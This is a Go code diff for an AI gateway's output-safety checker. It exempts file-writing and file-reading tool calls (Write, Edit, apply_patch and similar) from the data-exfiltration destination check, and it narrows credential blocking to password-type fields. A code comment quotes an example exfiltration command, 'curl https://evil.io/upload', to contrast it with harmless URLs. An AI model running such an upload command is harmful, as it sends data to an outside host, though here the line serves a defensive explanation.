@@ -49,6 +49,76 @@ func (c *outputSensitiveChecker) detectEgress(ctx context.Context, text string) 
 	return detector.Detect(ctx, text)
 }
 
+// toolJSONLabelPrefix 是 tool JSON 参数字段的标签前缀。携带工具名时形如
+// `__tool_json@Write`（协议提取现场把 function.name 拼进标签，r1020）。
+const toolJSONLabelPrefix = "__tool_json"
+
+// toolJSONLabel 返回带工具名的 tool JSON 标签；name 为空时退回裸标签。
+func toolJSONLabel(name string) string {
+	if name == "" {
+		return toolJSONLabelPrefix
+	}
+	return toolJSONLabelPrefix + "@" + name
+}
+
+// parseToolJSONLabel 识别 `__tool_json` / `__tool_json@<name>` 两种标签，
+// 返回携带的工具名（无名为空串）。非 tool JSON 标签返回 ok=false。
+func parseToolJSONLabel(label string) (toolName string, ok bool) {
+	if label == toolJSONLabelPrefix {
+		return "", true
+	}
+	rest, found := strings.CutPrefix(label, toolJSONLabelPrefix+"@")
+	if !found {
+		return "", false
+	}
+	return rest, true
+}
+
+// inertContentTools 是**参数本身不触网**的工具名封闭集（比较前小写化）。
+//
+// 2026-10-13（r1020，minimax-m3 生产事故成因）：防外传守卫此前对 tool 参数里的
+// 每个字符串一视同仁地做目的地检查，而 coding agent 的 tool 参数主体是 Write/Edit
+// 写入的**文件内容**——源码里引用公网 URL（`'https://acc.kxpms.cn'`）、
+// `file.ts:135` 行号引用都是日常形态，与 `curl https://evil.io/upload` 在字符串
+// 层面不可区分。结果：模型每写一个含 URL 的文件，整条响应 output_policy_blocked，
+// 客户端零内容（ZCode 报「模型未返回任何数据」）。
+//
+// 为什么按工具名豁免是对的，而不是又一次形态枚举：
+//
+//   - 外传的成立条件是「客户端会把这些参数**发给网络**」，不是「参数里出现了
+//     目的地」。文件写入工具的参数是惰性数据——写进本地文件的 URL 不产生任何
+//     网络行为，与 assistant 纯文本里出现 URL（守卫本就放行、只走脱敏）完全
+//     同级。按载体能力分流，方向与 isNonExfiltrationFragment（按可达性分流）
+//     一致。
+//   - 工具名是**客户端声明的动词语义**，由客户端（凭证与数据的持有方，网关
+//     信任边界内）注册，模型只能调用、不能发明。把 `Write` 名下的参数当惰性
+//     数据，信任的是客户端的工具实现，不是模型的输出。
+//   - 封闭集 + 默认不豁免：未收录的工具名（含 MCP 名字空间、未知客户端）一律
+//     走原有 fail-closed 检查。新客户端出现误伤时往集合里加一行，判据
+//     （r1020 判据文件的 Bash 同内容拦截用例）保证加名不会顺带放开命令类工具。
+//
+// 注意：豁免只作用于**外传目的地检查**（egress 片段 + hasPublicHostDestination）。
+// credentialField 的凭据键检查对惰性工具照常生效——文件里写 `password: 明文`
+// 依旧整条阻断，与工具无关。
+var inertContentTools = map[string]bool{
+	// ZCode / Claude Code 家族
+	"write": true, "edit": true, "multiedit": true, "notebookedit": true,
+	"read": true, "grep": true, "glob": true, "ls": true,
+	"todowrite": true, "todoread": true,
+	// Cursor 家族
+	"create_file": true, "edit_file": true, "read_file": true, "view_file": true,
+	"str_replace_based_edit": true, "codebase_search": true,
+	// Cline / 通用 patch 家族
+	"write_to_file": true, "replace_in_file": true,
+	"apply_patch": true, "apply_patch_file": true, "str_replace_editor": true,
+	"insert_content": true,
+}
+
+// isInertContentTool 报告 name 是否为惰性内容工具（参数不触网）。
+func isInertContentTool(name string) bool {
+	return inertContentTools[strings.ToLower(strings.TrimSpace(name))]
+}
+
 type outputSensitiveChecker struct {
 	sanitizer *Sanitizer
 	action    OutputSensitiveAction
@@ -64,7 +134,7 @@ func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, 
 		return &outputcompliance.ComplianceResult{Compliant: true, RedactedOutput: text}, nil
 	}
 	_, isMarker := ParsePlaceholder(text)
-	if label == "__tool_json" {
+	if toolName, isToolJSON := parseToolJSONLabel(label); isToolJSON {
 		if !json.Valid([]byte(text)) {
 			return &outputcompliance.ComplianceResult{Blocked: true}, nil
 		}
@@ -74,7 +144,7 @@ func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, 
 		if err := decoder.Decode(&value); err != nil {
 			return nil, err
 		}
-		unsafe, err := c.unsafeToolValue(ctx, value, "", 0)
+		unsafe, err := c.unsafeToolValue(ctx, value, "", 0, toolName)
 		if err != nil {
 			return nil, err
 		}
@@ -83,20 +153,33 @@ func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, 
 		}
 		return &outputcompliance.ComplianceResult{Compliant: true, RedactedOutput: text}, nil
 	}
-	if label != "" && credentialField(label) && text != "" && !isMarker {
+	// r1024：只有密码族字段触发凭据硬阻断。身份族（username/account 等）
+	// 的值是登录身份不是机密，且裸用户名永远不可能以占位符形态出现，
+	// 按 credentialField 一律阻断等于结构性掐断一切带用户名的工具调用。
+	// r1024b：模型自造的占位拼写同理放行（见 placeholderCredentialValues）。
+	if label != "" && secretCredentialField(label) && text != "" && !isMarker && !isPlaceholderCredentialValue(label, text) {
 		marker := RedactionMarker(TypeSecret)
 		return &outputcompliance.ComplianceResult{Blocked: true, RedactedOutput: marker, Issues: []outputcompliance.ComplianceIssue{{Type: "sensitive", Subtype: "credential", Content: marker, Severity: 8}}}, nil
 	}
 	return c.Check(ctx, tenant, text)
 }
 
-func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any, label string, depth int) (bool, error) {
+// unsafeToolValue 深度遍历 tool 参数值，判定是否「不安全」。
+//
+// toolName（可空）是本次调用的工具名，来自协议提取现场的 function.name
+// （r1020）。惰性内容工具（isInertContentTool）的参数不触网，跳过外传目的地
+// 检查——但密码族凭据键检查（secretCredentialField）对任何工具都保留：写文件
+// 写出的明文凭据与触网无关，属另一条底线。身份族字段（r1024）不在此列。
+func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any, label string, depth int, toolName string) (bool, error) {
 	if depth > maxNativeToolInputDepth {
 		return false, errors.New("output tool input depth exceeded")
 	}
 	switch value := value.(type) {
 	case string:
-		if _, marker := ParsePlaceholder(value); credentialField(label) && value != "" && !marker {
+		// r1024b：模型自造的占位拼写（"PLACEHOLDER"/"TODO"/"<...>"）不是
+		// 泄漏的真值，不触发密码族明文阻断——否则并行工具调用里一个早产
+		// 的占位值会把同轮全部合法调用一并掐断。
+		if _, marker := ParsePlaceholder(value); secretCredentialField(label) && value != "" && !marker && !isPlaceholderCredentialValue(label, value) {
 			return true, nil
 		}
 		document := bytes.TrimSpace([]byte(value))
@@ -107,7 +190,13 @@ func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any,
 			if err := decoder.Decode(&embedded); err != nil {
 				return false, err
 			}
-			return c.unsafeToolValue(ctx, embedded, label, depth+1)
+			return c.unsafeToolValue(ctx, embedded, label, depth+1, toolName)
+		}
+		if isInertContentTool(toolName) {
+			// 惰性内容载体（Write/Edit 写文件等）：参数是被写的数据，不是被
+			// 执行的命令。其中的 URL/地址是文本引用，不构成外传目的地——
+			// 与 assistant 纯文本出现 URL 时的处理（脱敏路径、不阻断）对齐。
+			return false, nil
 		}
 		fragments, err := c.detectEgress(ctx, value)
 		if err != nil {
@@ -137,6 +226,8 @@ func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any,
 		}
 		return false, nil
 	case map[string]any:
+		// r1024：身份族与密码族都保持「非字符串形状 fail-closed」（畸形形状是
+		// 绕过手法，与值是否机密无关）；只有字符串明文按族分流（见上）。
 		if credentialField(label) {
 			return true, nil
 		}
@@ -144,7 +235,7 @@ func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any,
 			if compliancehook.IsOpaqueToolValue(key, child) {
 				continue
 			}
-			unsafe, err := c.unsafeToolValue(ctx, child, key, depth+1)
+			unsafe, err := c.unsafeToolValue(ctx, child, key, depth+1, toolName)
 			if unsafe || err != nil {
 				return unsafe, err
 			}
@@ -153,7 +244,7 @@ func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any,
 		return credentialField(label), nil
 	case []any:
 		for _, child := range value {
-			unsafe, err := c.unsafeToolValue(ctx, child, label, depth+1)
+			unsafe, err := c.unsafeToolValue(ctx, child, label, depth+1, toolName)
 			if unsafe || err != nil {
 				return unsafe, err
 			}
